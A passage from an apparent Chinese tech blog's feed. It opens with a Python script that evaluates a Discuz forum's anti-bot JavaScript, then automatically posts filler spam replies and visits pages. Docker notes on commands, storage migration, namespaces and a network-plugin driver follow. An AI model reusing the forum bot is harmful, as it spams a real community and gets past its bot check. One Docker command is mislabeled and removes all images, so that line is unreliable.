attrs&#x3D;&#123;&quot;href&quot;:re.compile(r&quot;forum.php\\?mod&#x3D;forumdisplay&amp;fid&#x3D;\\d+&quot;)&#125;)</span><br><span class="line">            subformDicts&#x3D;&#123;&#125;</span><br><span class="line">            for subform in h1userSoupList:</span><br><span class="line">                if subform.get\_text() in self.subform:</span><br><span class="line">                   # subforms.append(self.args\[&#39;baseUrl&#39;\]+subform\[&quot;href&quot;\])</span><br><span class="line">                    url&#x3D;self.args\[&#39;baseUrl&#39;\]+subform\[&quot;href&quot;\]</span><br><span class="line">                    result&#x3D;urlparse.urlparse(url)</span><br><span class="line">                    params&#x3D;urlparse.parse\_qs(result.query,True)</span><br><span class="line">                    tag&#x3D; params\[&#39;fid&#39;\]\[0\]</span><br><span class="line">                    subformDicts\[tag\]&#x3D;url</span><br><span class="line">            return subformDicts</span><br><span class="line">        else:</span><br><span class="line">            print &#39;Error Please Login...&#39;</span><br><span class="line"></span><br><span class="line">    def getNewUrlFromJs(self,js):</span><br><span class="line">       js&#x3D;js\[31:-9\]</span><br><span class="line">       for st in \[&#39;window&#39;,&#39;location&#39;,&quot;&#39;assign&#39;&quot;,&quot;&#39;href&#39;&quot;,&quot;&#39;replace&#39;&quot;\]:</span><br><span class="line">            equal&#x3D;re.findall(&#39;\[\_A-Za-z0-9 &#x3D;\]+%s;&#39;%st,js)</span><br><span class="line">            if equal&#x3D;&#x3D;\[\]:</span><br><span class="line">                continue</span><br><span class="line">            else:</span><br><span class="line">               equal&#x3D;equal\[0\]</span><br><span class="line">               var&#x3D;equal.split(&#39;&#x3D;&#39;)\[0\].strip()</span><br><span class="line">               js&#x3D;js.replace(equal,&#39;&#39;)</span><br><span class="line">               js&#x3D;js.replace(var,st)</span><br><span class="line">               js&#x3D;js.replace(&quot;\[&#39;%s&#39;\]&quot;%st.strip(&quot;&#39;&quot;),&#39;.%s&#39;%st.strip(&quot;&#39;&quot;))</span><br><span class="line">       if re.findall(&#39;window\\.href&#x3D;.+&#39;,js)!&#x3D;\[\]:</span><br><span class="line">           js&#x3D;js.replace(re.findall(&#39;window\\.href&#x3D;.+&#39;,js)\[0\],&#39;&#39;)</span><br><span class="line">       js&#x3D;js.replace(&#39;location.href&#x3D;&#39;,&#39;&#39;).replace(&#39;location.replace&#39;,&#39;&#39;).replace(&#39;location.assign&#39;,&#39;&#39;)</span><br><span class="line">       ctxt2 &#x3D; PyV8.JSContext()</span><br><span class="line">       ctxt2.enter()</span><br><span class="line">       return ctxt2.eval(js)</span><br><span class="line"></span><br><span class="line">    def haveAGoodLuck(self):</span><br><span class="line">        luckurl&#x3D;&#39;http:&#x2F;&#x2F;bbs.iop365.com&#x2F;iop&#x2F;&#x2F;plugin.php?id&#x3D;yinxingfei\_zzza:yinxingfei\_zzza\_hall&amp;yjjs&#x3D;yes&#39;</span><br><span class="line">        response &#x3D; urllib2.urlopen(luckurl)</span><br><span class="line">        content &#x3D; response.read()</span><br><span class="line">        formhashs &#x3D; re.search(self.regex\[&#39;replyreg&#39;\], content)</span><br><span class="line">        formhash&#x3D; formhashs.group(1)</span><br><span class="line">        soup &#x3D; BeautifulSoup(content,&quot;html.parser&quot;)</span><br><span class="line">        submitUrl2&#x3D;&#39;http:&#x2F;&#x2F;bbs.iop365.com&#x2F;iop&#x2F;&#x2F;plugin.php?id&#x3D;yinxingfei\_zzza:yinxingfei\_zzza\_post&#39;</span><br><span class="line">        replydata &#x3D; urllib.urlencode(&#123;</span><br><span class="line">                    &#39;formhash&#39;: formhash</span><br><span class="line">                &#125;)</span><br><span class="line">        request &#x3D; urllib2.Request(submitUrl2,replydata)</span><br><span class="line">        response &#x3D; urllib2.urlopen(request)</span><br><span class="line"> </span><br><span class="line">    def visitUser(self):</span><br><span class="line">        baseUrl&#x3D;&#39;http:&#x2F;&#x2F;bbs.iop365.com&#x2F;iop&#x2F;?%s&#39;</span><br><span class="line">        for i in range(1,10):</span><br><span class="line">            randNum&#x3D;random.randint(1, 200)</span><br><span class="line">            visitUrl&#x3D;baseUrl %(randNum)</span><br><span class="line">            response &#x3D; urllib2.urlopen(visitUrl)</span><br><span class="line">            content &#x3D; response.read()</span><br><span class="line">            print visitUrl</span><br><span class="line">    def InitDB(self):</span><br><span class="line">        self.conn &#x3D; sqlite3.connect(&#39;data.db&#39;)</span><br><span class="line">        self.cur &#x3D; self.conn.cursor()</span><br><span class="line">        sql &#x3D; &#39;&#39;&#39;create table if not exists post (</span><br><span class="line">            fid text,</span><br><span class="line">            tid text,</span><br><span class="line">            replied integer)&#39;&#39;&#39;</span><br><span class="line">        self.cur.execute(sql)</span><br><span class="line">        self.conn.commit()</span><br><span class="line"></span><br><span class="line">    def getTopicList(self,sunFormUrl):</span><br><span class="line">         topicDis&#x3D;&#123;&#125;</span><br><span class="line">         if self.islogin:</span><br><span class="line">            fidurl &#x3D; sunFormUrl</span><br><span class="line">            response &#x3D; urllib2.urlopen(fidurl)</span><br><span class="line">            content &#x3D; response.read()</span><br><span class="line">            soup &#x3D; BeautifulSoup(content,&quot;html.parser&quot;)</span><br><span class="line">            h1userSoupList&#x3D;soup.findAll(name&#x3D;&quot;a&quot;, attrs&#x3D;&#123;&quot;href&quot;: re.compile(r&quot;forum.php\\?mod&#x3D;viewthread\\&amp;&quot;),&quot;onclick&quot;:&quot;atarget(this)&quot;&#125;)</span><br><span class="line">            for topic in h1userSoupList:</span><br><span class="line">                 #topics.append(self.args\[&#39;baseUrl&#39;\]+topic\[&quot;href&quot;\])</span><br><span class="line">                 url&#x3D;self.args\[&#39;baseUrl&#39;\]+topic\[&quot;href&quot;\]</span><br><span class="line">                 result&#x3D;urlparse.urlparse(url)</span><br><span class="line">                 params&#x3D;urlparse.parse\_qs(result.query,True)</span><br><span class="line">                 topicDis\[params\[&#39;tid&#39;\]\[0\]\]&#x3D;url</span><br><span class="line">            return topicDis</span><br><span class="line">         else:</span><br><span class="line">             print &#39;user doest not login&#39;</span><br><span class="line"></span><br><span class="line">if \_\_name\_\_ &#x3D;&#x3D; &#39;\_\_main\_\_&#39;:</span><br><span class="line">    #username &#x3D; raw\_input(&#39;username:&#39;).strip()</span><br><span class="line">    #password &#x3D; getpass.getpass(&#39;password:&#39;).strip()</span><br><span class="line">    args &#x3D; &#123;</span><br><span class="line">            &#39;loginurl&#39;: &#39;http:&#x2F;&#x2F;bbs.iop365.com&#x2F;forum.php&#39;,</span><br><span class="line">            &#39;loginsubmiturl&#39;: &#39;http:&#x2F;&#x2F;bbs.iop365.com&#x2F;iop&#x2F;member.php?mod&#x3D;logging&amp;action&#x3D;login&amp;loginsubmit&#x3D;yes&amp;infloat&#x3D;yes&amp;lssubmit&#x3D;yes&amp;inajax&#x3D;1&#39;,</span><br><span class="line">            &#39;fidurl&#39;: &#39;http:&#x2F;&#x2F;bbs.iop365.com&#x2F;iop&#x2F;forum.php&#39;,</span><br><span class="line">            &#39;tidurl&#39;: &#39;http:&#x2F;&#x2F;bbs.iop365.com&#x2F;thread-%s-1-1.html&#39;,</span><br><span class="line">            &#39;replysubmiturl&#39;: &#39;http:&#x2F;&#x2F;bbs.iop365.com&#x2F;iop&#x2F;&#x2F;forum.php?mod&#x3D;post&amp;action&#x3D;reply&amp;fid&#x3D;%s&amp;tid&#x3D;%s&amp;extra&#x3D;&amp;replysubmit&#x3D;yes&amp;infloat&#x3D;yes&amp;handlekey&#x3D;fastpost&amp;inajax&#x3D;1&#39;,</span><br><span class="line">            &#39;referer&#39;:&#39;http:&#x2F;&#x2F;bbs.iop365.com&#x2F;forum.php&#39; ,</span><br><span class="line">            &#39;baseUrl&#39;:&#39;http:&#x2F;&#x2F;bbs.iop365.com&#x2F;iop&#x2F;&#39;,</span><br><span class="line">             &#39;redirectBaseUrl&#39;: &#39;http:&#x2F;&#x2F;bbs.iop365.com&#x2F;&#39;&#125;</span><br><span class="line">    userInfo&#x3D;&#123;&#39;wangdk&#39;:&#39;\*\*\*\*&#39;&#125;</span><br><span class="line">    for (username,password) in userInfo.items():</span><br><span class="line">        dz &#x3D; Discuz(username, password,args)</span><br><span class="line">        subforms &#x3D; dz.GetSubForms()</span><br><span class="line">        dz.visitUser()</span><br><span class="line">        topicNum&#x3D;0</span><br><span class="line">        allTopics&#x3D;&#123;&#125;</span><br><span class="line">        for fid in subforms:</span><br><span class="line">          topics&#x3D;dz.getTopicList(subforms\[fid\])</span><br><span class="line">          for tid in topics:</span><br><span class="line">               topicNum&#x3D;topicNum+1</span><br><span class="line">               allTopics\[topicNum\]&#x3D;&#123;&#39;fid&#39;:fid,&#39;tid&#39;:tid,&#39;topicUrl&#39;:topics\[tid\]&#125;</span><br><span class="line">        randNum&#x3D;random.randint(1, topicNum)</span><br><span class="line">        print  &#39;good luck time&#x3D;%s&#39;,time.strftime( &quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime() )</span><br><span class="line">        dz.PostReply(allTopics\[randNum\]\[&#39;fid&#39;\],allTopics\[randNum\]\[&#39;tid&#39;\],allTopics\[randNum\]\[&#39;topicUrl&#39;\],&#39;guanshui,haha&#39;)</span><br><span class="line">        print &#39;topicUrl %s&#39;,allTopics\[randNum\]\[&#39;topicUrl&#39;\]</span><br><span class="line">        dz.haveAGoodLuck()</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>docker与主机关系</title>
    <url>/2020/09/03/Docker%E4%B8%8E%E4%B8%BB%E6%9C%BA%E5%85%B3%E7%B3%BB/</url>
    <content><![CDATA[]]></content>
  </entry>
  <entry>
    <title>docker使用进阶</title>
    <url>/2020/09/03/Docker%E4%BD%BF%E7%94%A8%E8%BF%9B%E9%98%B6/</url>
    <content><![CDATA[<h2 id="docker不太常用的命令"><a href="#docker不太常用的命令" class="headerlink" title="docker不太常用的命令"></a>docker不太常用的命令</h2><ul>
<li>docker ps -s  #查看容器所占的磁盘大小</li>
<li>docker rm ${docker ps -q -a} # 删除全部非运行态的容器</li>
<li>docker system df  #查看docker存储的使用情况</li>
<li>docker system prun #清理无用的容器、网络、数据集</li>
<li>docker rmi $(docker images | awk ‘/^<none>/ { print $3 }’) #删除的镜像repositry为none的镜像</none></li>
<li>删除 未被使用的镜像 docker rmi $(docker images | awk ‘ { print $3 }’)</li>
</ul>
<h2 id="docker配置参数"><a href="#docker配置参数" class="headerlink" title="docker配置参数"></a>docker配置参数</h2><ol>
<li>–iptables ,该参数用于控制是否允许docker去管理iptables，当设置为true时，允许docker去管理iptbales表<ul>
<li>通常在docker单独使用时，需要这样配置，如果配置为false，iptables被清空后，是无法自动创建的</li>
<li>在基于Kubernetes等管理docker时，可以配置iptables=false</li>
</ul>
</li>
<li>–ip-forward，该参数用于控主机容器与外部网络之间的相互通信，当设置为true时，允许容器被外部访问，当设置为false时，外部是无法访问到容器<ul>
<li>当宿主机设置了ip_forward参数为1时，会以宿主机的配置为准，docker的改配置参数无效</li>
</ul>
</li>
</ol>
<h2 id="迁移docker存储方式一"><a href="#迁移docker存储方式一" class="headerlink" title="迁移docker存储方式一"></a>迁移docker存储方式一</h2><p>若docker已经运行一段时间，并存在运行的容器，可以采用以下方法进行容器存储的迁移</p>
<ol>
<li>停止全部容器</li>
<li>停止docker：systemctl stop docker</li>
<li>mkdir -p /sl/docker/</li>
<li>移动docker存储：mv /var/lib/docker/* /sl/docker/</li>
<li>建立软连接：ln -s /sl/docker /var/lib/</li>
<li>systemctl start docker</li>
</ol>
<p>==注意删除软连接是 rm /var/lib/docker  后面不能有斜杠，否则是删除整个目录)==</p>
<h2 id="迁移docker存储方式二"><a href="#迁移docker存储方式二" class="headerlink" title="迁移docker存储方式二"></a>迁移docker存储方式二</h2><ol>
<li>停止全部容器</li>
<li>停止docker：systemctl stop docker</li>
<li>cd /sl</li>
<li>mkdir dockerdaemon</li>
<li>cd /sl/dockerdaemon</li>
<li>tar  -czvpf docker.tar.gz /var/lib/docker</li>
<li>tar  zxvf docker.tar.gz -C /sl/dockerdaemon</li>
<li>cd /sl/dockerdaemon/var/lib/</li>
<li>mv docker/ ../../</li>
<li>mv /var/lib/docker /sl/backup</li>
<li>ln -s /sl/dockerdaemon/docker /var/lib/</li>
</ol>
<h2 id="基于操作系统制作docker镜像"><a href="#基于操作系统制作docker镜像" class="headerlink" title="基于操作系统制作docker镜像"></a>基于操作系统制作docker镜像</h2><p>执行以下操作</p>
<ol>
<li>tar –exclude=/usr/lib32  -cPvf fedora21-base.tar /home</li>
</ol>
<p>将本机运行的操作系统打成一个fedora21-base.tar包，其中–exclude参数是将不需要的目录排除，可以使用–exclude多个参数排除多个目录。</p>
<ol start="2">
<li>cat fedora21-base.tar | docker import - fedora21-base</li>
</ol>
<p>将tar包使用docker import编译导入镜像</p>
<ol start="3">
<li>docker run -i -t fedora21-base  /bin/bash</li>
</ol>
<p>启动镜像。-i 代表打开标准输入 -t 虚拟一个窗口 /bin/bash启动镜像执行的命令</p>
<h2 id="进入容器命名空间"><a href="#进入容器命名空间" class="headerlink" title="进入容器命名空间"></a>进入容器命名空间</h2><p>获取容器的init pid<br>cat /run/containerd/io.containerd.runtime.v1.linux/moby/7208ab53697925439605bca93718c6158db354909fedbe7a1f96ddcd5d5563db/init.pid<br>18399<br>进入mount 命名空间,可以直接查看容器的目录空间<br>nsenter -t 18399 -m<br>进入</p>
<h2 id="docker-NET-ADMIN-权限"><a href="#docker-NET-ADMIN-权限" class="headerlink" title="docker NET_ADMIN 权限"></a>docker NET_ADMIN 权限</h2><p>允许在容器内进行一些网络的操作权限，在某些情况下如果容器具有该权限后，会操作宿主机的网络(为容器设置–net=host时，会对宿主机网络带来安全隐患)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">For interacting with the network stack, instead of using --privileged they should use --cap-add&#x3D;NET_ADMIN to modify the network interfaces.</span><br><span class="line">CAP_NET_ADMIN lets you use the SIOCETHTOOL ioctl() on any network device inside the namespace. This includes commands like ETHTOOL_FLASHDEV, i.e. ethtool -f</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Perform various network-related operations:</span><br><span class="line">- interface configuration;</span><br><span class="line">- administration of IP firewall, masquerading, and accounting</span><br><span class="line">- modify routing tables;</span><br><span class="line">- bind to any address for transparent proxying;</span><br><span class="line">- set type-of-service (TOS)</span><br><span class="line">- clear driver statistics;</span><br><span class="line">- set promiscuous mode;</span><br><span class="line">- enabling multicasting;</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>docker以网络插件方式实现Pipework</title>
    <url>/2020/09/21/Docker%E4%BB%A5%E7%BD%91%E7%BB%9C%E6%8F%92%E4%BB%B6%E6%96%B9%E5%BC%8F%E5%AE%9E%E7%8E%B0Pipework/</url>
    <content><![CDATA[<p>  docker目前提供了多种网络模式，但是相信大部分运维人员还是比较相信物理网络，所以就想着将容器的网络配置成物理网络。可以看到开源项目<a href="https://github.com/jpetazzo/pipework" target="_blank" rel="noopener">Pipework</a>，当然 Pipework的功能比较强大，这里我只关注容器使用物理网络的实现，如果你手动去配置容器的IP，可以只需要以下几个步骤：</p>
<p>1、创建网桥并配置，将eth0绑定到网桥br0，docker Daemon 监听br0</p>
<p>2、启动容器</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d --net&#x3D;none --name web  10.110.17.138:5000&#x2F;library&#x2F;tomcat:7.0.67-jre7</span><br></pre></td></tr></table></figure>
<p>3、创建Container对应的网络命名空间</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir -p &#x2F;var&#x2F;run&#x2F;netns</span><br><span class="line">ln -s &#x2F;proc&#x2F;1381&#x2F;ns&#x2F;net &#x2F;var&#x2F;run&#x2F;netns&#x2F;1381</span><br></pre></td></tr></table></figure>
<p>4、容器配置网卡</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ip link add veth-a type veth peer name veth-b</span><br><span class="line">brctl addif br0 veth-a</span><br><span class="line">ip link set veth-a up</span><br><span class="line">ip link set veth-b netns 1381</span><br><span class="line">ip netns exec 1381 ip link set dev veth-b name eth0 </span><br><span class="line">ip netns exec 1381 ip link set eth0 up</span><br><span class="line">ip netns exec 1381 ip addr add 10.110.17.94&#x2F;24 dev eth0 </span><br><span class="line">ip netns exec 1381 ip route del default</span><br><span class="line">ip netns exec 1381 ip route add default via 10.110.17.254</span><br></pre></td></tr></table></figure>
<p>    不是很复杂，业务系统可以定义一个脚本执行就OK，但是我们再开发使用过程中发现，当我们想着将这种网络模式运用到Compose时，却发现用不了，但是Compose支持docker 的网络插件机制，所以就需要考虑使用<a href="https://github.com/docker/libnetwork/blob/master/docs/remote.md" target="_blank" rel="noopener">docker的网络插件机制</a>实现。参考了<a href="https://github.com/weaveworks/weave" target="_blank" rel="noopener">Weave</a>和<a href="https://github.com/gopher-net/docker-ovs-plugin" target="_blank" rel="noopener">ovs-plugin</a>的实现方式，整理出了docker使用物理网络的插件<a href="https://github.com/davidstack/docker-network-plugin-local.git" target="_blank" rel="noopener">docker-network-plugin-local</a>，当然github上开源的仅仅是网络配置OK，和我们生产环境上的肯定有所区别，不过大家可以参考，在这里说一下几处关键代码。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func (driver \*PipeNetworkDriver) CreateNetwork(createNetworkRequest \*network.CreateNetworkRequest) error &#123;</span><br><span class="line">	GlobalEndPointCache.Mutex.Lock()</span><br><span class="line">	defer func() &#123;</span><br><span class="line">		GlobalEndPointCache.Mutex.Unlock()</span><br><span class="line">	&#125;()</span><br><span class="line">	gateway, mask, \_ :&#x3D; getGatewayIP(createNetworkRequest)</span><br><span class="line">	networkInfo :&#x3D; NetworkInfo&#123;BridgeName: &quot;br0&quot;,</span><br><span class="line">		Gateway:            gateway,</span><br><span class="line">		GatewayMask:        mask,</span><br><span class="line">		ContainerInterface: &quot;eth1&quot;,</span><br><span class="line">		MTU:                1500,</span><br><span class="line">		NetWorkId:          createNetworkRequest.NetworkID,</span><br><span class="line">	&#125;</span><br><span class="line">	GlobalEndPointCache.EndPoints &#x3D; make(map\[string\]\*EndPoint)</span><br><span class="line">	GlobalEndPointCache.Network &#x3D; &amp;networkInfo</span><br><span class="line">	driver.UpdateCacheFile()</span><br><span class="line">	return nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p> 此处是命令行执行docker network create 时调用的API，这个插件是将网络信息缓存到了本地，其他什么也没有做（如果你想在集群环境中使用，可以修改此处，将网络信息保存到Etcd数据库）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func (driver \*PipeNetworkDriver) CreateEndpoint(createEndpointRequest \*network.CreateEndpointRequest) (\*network.CreateEndpointResponse, error) &#123;</span><br><span class="line">	fmt.Println(&quot;create endpoint&quot;)</span><br><span class="line">	GlobalEndPointCache.Mutex.Lock()</span><br><span class="line">	defer func() &#123;</span><br><span class="line">		GlobalEndPointCache.Mutex.Unlock()</span><br><span class="line">	&#125;()</span><br><span class="line">	endPointId :&#x3D; createEndpointRequest.EndpointID</span><br><span class="line">	ipaddress :&#x3D; createEndpointRequest.Interface.Address</span><br><span class="line">	vethPairTag :&#x3D; truncateID(endPointId)</span><br><span class="line">	vethPariA :&#x3D; vethPairTag + &quot;-a&quot;</span><br><span class="line">	vethPariB :&#x3D; vethPairTag + &quot;-b&quot;</span><br><span class="line">	endPoint :&#x3D; EndPoint&#123;EndpointID: endPointId,</span><br><span class="line">		Address:      ipaddress,</span><br><span class="line">		VethName:     vethPariA,</span><br><span class="line">		VethPeerName: vethPariB&#125;</span><br><span class="line">	GlobalEndPointCache.EndPoints\[endPointId\] &#x3D; &amp;endPoint</span><br><span class="line">	driver.UpdateCacheFile()</span><br><span class="line">	return nil, nil</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>此处是在创建容器时，指定driver时调用的API，该插件只是定义了需要创建的link 对（veth pair），然后缓存起来</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">func (driver \*PipeNetworkDriver) Join(joinRequest \*network.JoinRequest) (\*network.JoinResponse, error) &#123;</span><br><span class="line">	fmt.Println(&quot;joing....&quot;)</span><br><span class="line">	fmt.Println(&quot;NetworkID is &quot;, joinRequest.NetworkID)</span><br><span class="line">	fmt.Println(&quot;SandboxKey is &quot;, joinRequest.SandboxKey)</span><br><span class="line"></span><br><span class="line">	GlobalEndPointCache.Mutex.Lock()</span><br><span class="line">	defer func() &#123;</span><br><span class="line">		GlobalEndPointCache.Mutex.Unlock()</span><br><span class="line">	&#125;()</span><br><span class="line">	&#x2F;&#x2F;query from cache</span><br><span class="line">	endPointInfo :&#x3D; GlobalEndPointCache.EndPoints\[joinRequest.EndpointID\]</span><br><span class="line">	fmt.Println(&quot;vethPairA is &quot;, endPointInfo.VethName)</span><br><span class="line">	fmt.Println(&quot;vethPairB is &quot;, endPointInfo.VethPeerName)</span><br><span class="line"></span><br><span class="line">	localVethPair :&#x3D; vethPair(endPointInfo.VethName, endPointInfo.VethPeerName)</span><br><span class="line">	if err :&#x3D; netlink.LinkAdd(localVethPair); err !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(&quot;failed to create the veth pair named: \[ %v \] error: \[ %s \] &quot;, localVethPair, err)</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(&quot;localVethPair.Name is &quot;, localVethPair.Name)</span><br><span class="line">	&#x2F;&#x2F; 2. add vethPariA to bridge and set up</span><br><span class="line">	createdLink, linkErr :&#x3D; netlink.LinkByName(localVethPair.Name)</span><br><span class="line">	if linkErr !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(&quot;find link failed&quot;, linkErr)</span><br><span class="line">		return nil, linkErr</span><br><span class="line">	&#125;</span><br><span class="line">	netinterface :&#x3D; net.Interface&#123;Index: createdLink.Attrs().Index,</span><br><span class="line">		Name:         createdLink.Attrs().Name,</span><br><span class="line">		MTU:          createdLink.Attrs().MTU,</span><br><span class="line">		Flags:        createdLink.Attrs().Flags,</span><br><span class="line">		HardwareAddr: createdLink.Attrs().HardwareAddr&#125;</span><br><span class="line"></span><br><span class="line">	br, err :&#x3D; tenus.BridgeFromName(GlobalEndPointCache.Network.BridgeName)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(&quot;use exist bridge failed&quot;, err)</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if err &#x3D; br.AddSlaveIfc(&amp;netinterface); err !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(&quot;add interface to bridge failed&quot;, err)</span><br><span class="line">	&#125;</span><br><span class="line">	err &#x3D; netlink.LinkSetUp(createdLink)</span><br><span class="line">	if err !&#x3D; nil &#123;</span><br><span class="line">		fmt.Println(&quot;Error enabling  Veth local iface: \[ %v \]&quot;, localVethPair)</span><br><span class="line">		return nil, err</span><br><span class="line">	&#125;</span><br><span class="line">	response :&#x3D; network.JoinResponse&#123;InterfaceName: network.InterfaceName&#123;SrcName: endPointInfo.VethPeerName,</span><br><span class="line">		DstPrefix: &quot;eth&quot;&#125;,</span><br><span class="line">		Gateway: GlobalEndPointCache.Network.Gateway,</span><br><span class="line">	&#125;</span><br><span class="line">	GlobalEndPointCache.EndPoints\[joinRequest.EndpointID\].SandboxKey &#x3D; joinRequest.SandboxKey</span><br><span class="line">	driver.UpdateCacheFile()</span><br><span class="line">	return &amp;response, nil</span><br><span class="line">&#125;</span><br><span class="line">&#96;</span><br></pre></td></tr></table></figure>
<p>        <br>此处代码也是在docker 创建/启动容器时调用的API，该API完成link对的创建，并未改link（在容器内部的部分）配置IP，定义网卡名称，此处最重要的是返回值中将正确的vethpari那么返回，docker daemon会将veth pair加入到容器的网络空间 （PS：开始验证的时候，一直尝试自己将这个veth pair加入到命名空间，总是不成功，后来才发现，docker Daemon 已经把这件事干了）</p>
]]></content>
  </entry>
  <entry>
    <title>docker 默认的Container名称生成</title>
    <url>/2020/09/21/Docker-%E9%BB%98%E8%AE%A4%E7%9A%84Container%E5%90%8D%E7%A7%B0%E7%94%9F%E6%88%90/</url>
    <content><![CDATA[<p>        当基于docker创建Container时，如果不指定容器名称，docker Damon会默认生成容器名称，这个名称看着是个真实的名称，找了一下docker的代码，发现了生成名称的机制，代码文件：<a href="https://github.com/docker/docker" target="_blank" rel="noopener">docker</a>/<a href="https://github.com/docker/docker/tree/master/pkg" target="_blank" rel="noopener">pkg</a>/<a href="https://github.com/docker/docker/tree/master/pkg/namesgenerator" target="_blank" rel="noopener">namesgenerator</a>/names-generator.go。查看代码，发现这些名称都是一些名人的名称，我只想说一句，docker 好任性。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package namesgenerator</span><br><span class="line"></span><br><span class="line">import (</span><br><span class="line">	&quot;fmt&quot;</span><br><span class="line"></span><br><span class="line">	&quot;github.com&#x2F;docker&#x2F;docker&#x2F;pkg&#x2F;random&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">var (</span><br><span class="line">	left &#x3D; \[...\]string&#123;</span><br><span class="line">		&quot;admiring&quot;,</span><br><span class="line">		&quot;adoring&quot;,</span><br><span class="line">		&quot;agitated&quot;,</span><br><span class="line">		&quot;amazing&quot;,</span><br><span class="line">		&quot;angry&quot;,</span><br><span class="line">		&quot;awesome&quot;,</span><br><span class="line">		&quot;backstabbing&quot;,</span><br><span class="line">		&quot;berserk&quot;,</span><br><span class="line">		&quot;big&quot;,</span><br><span class="line">		&quot;boring&quot;,</span><br><span class="line">		&quot;clever&quot;,</span><br><span class="line">		&quot;cocky&quot;,</span><br><span class="line">		&quot;compassionate&quot;,</span><br><span class="line">		&quot;condescending&quot;,</span><br><span class="line">		&quot;cranky&quot;,</span><br><span class="line">		&quot;desperate&quot;,</span><br><span class="line">		&quot;determined&quot;,</span><br><span class="line">		&quot;distracted&quot;,</span><br><span class="line">		&quot;dreamy&quot;,</span><br><span class="line">		&quot;drunk&quot;,</span><br><span class="line">		&quot;ecstatic&quot;,</span><br><span class="line">		&quot;elated&quot;,</span><br><span class="line">		&quot;elegant&quot;,</span><br><span class="line">		&quot;evil&quot;,</span><br><span class="line">		&quot;fervent&quot;,</span><br><span class="line">		&quot;focused&quot;,</span><br><span class="line">		&quot;furious&quot;,</span><br><span class="line">		&quot;gigantic&quot;,</span><br><span class="line">		&quot;gloomy&quot;,</span><br><span class="line">		&quot;goofy&quot;,</span><br><span class="line">		&quot;grave&quot;,</span><br><span class="line">		&quot;happy&quot;,</span><br><span class="line">		&quot;high&quot;,</span><br><span class="line">		&quot;hopeful&quot;,</span><br><span class="line">		&quot;hungry&quot;,</span><br><span class="line">		&quot;infallible&quot;,</span><br><span class="line">		&quot;jolly&quot;,</span><br><span class="line">		&quot;jovial&quot;,</span><br><span class="line">		&quot;kickass&quot;,</span><br><span class="line">		&quot;lonely&quot;,</span><br><span class="line">		&quot;loving&quot;,</span><br><span class="line">		&quot;mad&quot;,</span><br><span class="line">		&quot;modest&quot;,</span><br><span class="line">		&quot;naughty&quot;,</span><br><span class="line">		&quot;nauseous&quot;,</span><br><span class="line">		&quot;nostalgic&quot;,</span><br><span class="line">		&quot;peaceful&quot;,</span><br><span class="line">		&quot;pedantic&quot;,</span><br><span class="line">		&quot;pensive&quot;,</span><br><span class="line">		&quot;prickly&quot;,</span><br><span class="line">		&quot;reverent&quot;,</span><br><span class="line">		&quot;romantic&quot;,</span><br><span class="line">		&quot;sad&quot;,</span><br><span class="line">		&quot;serene&quot;,</span><br><span class="line">		&quot;sharp&quot;,</span><br><span class="line">		&quot;sick&quot;,</span><br><span class="line">		&quot;silly&quot;,</span><br><span class="line">		&quot;sleepy&quot;,</span><br><span class="line">		&quot;small&quot;,</span><br><span class="line">		&quot;stoic&quot;,</span><br><span class="line">		&quot;stupefied&quot;,</span><br><span class="line">		&quot;suspicious&quot;,</span><br><span class="line">		&quot;tender&quot;,</span><br><span class="line">		&quot;thirsty&quot;,</span><br><span class="line">		&quot;tiny&quot;,</span><br><span class="line">		&quot;trusting&quot;,</span><br><span class="line">		&quot;zen&quot;,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	&#x2F;&#x2F; docker, starting from 0.7.x, generates names from notable scientists and hackers.</span><br><span class="line">	&#x2F;&#x2F; Please, for any amazing man that you add to the list, consider adding an equally amazing woman to it, and vice versa.</span><br><span class="line">	right &#x3D; \[...\]string&#123;</span><br><span class="line">		&#x2F;&#x2F; Muhammad ibn Jābir al-Ḥarrānī al-Battānī was a founding father of astronomy. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Mu%E1%B8%A5ammad\_ibn\_J%C4%81bir\_al-%E1%B8%A4arr%C4%81n%C4%AB\_al-Batt%C4%81n%C4%AB</span><br><span class="line">		&quot;albattani&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Frances E. Allen, became the first female IBM Fellow in 1989. In 2006, she became the first female recipient of the ACM&#39;s Turing Award. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Frances\_E.\_Allen</span><br><span class="line">		&quot;allen&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; June Almeida - Scottish virologist who took the first pictures of the rubella virus - https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;June\_Almeida</span><br><span class="line">		&quot;almeida&quot;,</span><br><span class="line"></span><br><span class="line">		&#x2F;&#x2F; Maria Gaetana Agnesi - Italian mathematician, philosopher, theologian and humanitarian. She was the first woman to write a mathematics handbook and the first woman appointed as a Mathematics Professor at a University. https:&#x2F;&#x2F;en.wikipedia.org&#x2F;wiki&#x2F;Maria\_Gaetana\_Agnesi</span><br><span class="line">		&quot;agnesi&quot;,</span><br><span 